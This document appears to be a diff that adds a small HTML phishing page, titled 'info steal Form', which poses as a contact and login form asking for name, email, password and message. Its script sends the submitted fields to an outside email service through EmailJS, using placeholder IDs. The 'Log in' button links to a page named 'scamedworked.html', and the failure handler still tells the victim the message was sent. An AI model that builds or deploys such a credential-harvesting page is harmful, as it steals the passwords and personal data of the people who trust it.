@@ -1,0 +1,51 @@
+<!DOCTYPE html>
+<html lang="en">
+
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <link rel="stylesheet" href="index.css">
+    <title>info steal Form</title>
+</head>
+
+<body>
+    <a href="html.html">Index</a>
+    <h1>Contact mee</h1>
+    <form id="contact-form">
+        <label for="name">Name:</label>
+        <input type="text" id="name" name="name" required><br><br>
+
+        <label for="email">Email:</label>
+        <input type="email" id="email" name="email" required><br><br>
+        <label for="password">Password:</label>
+        <input type="image" id="password" name="password" required><br><br>
+
+
+        <label for="message">Message:</label>
+        <textarea id="message" name="message" required></textarea><br><br>
+
+        <a href="scamedworked.html"><input type="button" value="Log in"></a>
+    </form>
+
+    <!-- Include EmailJS Script -->
+    <script src="https://cdn.emailjs.com/dist/email.min.js"></script>
+    <script>
+        // Initialize EmailJS
+        emailjs.init("YOUR_USER_ID"); // Replace with your EmailJS User ID
+
+        document.getElementById("contact-form").addEventListener("submit", function (event) {
+            event.preventDefault(); // Prevent form from submitting the default way
+
+            emailjs.sendForm("YOUR_SERVICE_ID", "YOUR_TEMPLATE_ID", this)
+                .then(function (response) {
+                    alert("Message sent successfully!");
+                    console.log("SUCCESS!", response.status, response.text);
+                }, function (error) {
+                    alert("Sent message.");
+                    console.error("FAILED...", error);
+                });
+        });
+    </script>
+</body>
+
+</html>
